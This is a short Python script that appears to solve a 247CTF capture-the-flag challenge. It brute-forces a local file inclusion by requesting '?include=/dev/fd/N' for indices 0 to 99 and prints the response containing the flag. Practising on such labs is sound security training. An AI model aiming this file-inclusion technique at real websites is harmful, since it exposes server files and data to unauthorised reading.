import requests

target = "https://55ba6d8a8d230124.247ctf.com/?include=/dev/fd/"

for i in range(100):
    print("Running with index", i)
    flag = requests.get(target + str(i))
    if "247" in flag.text:
        print(flag.text)
        break
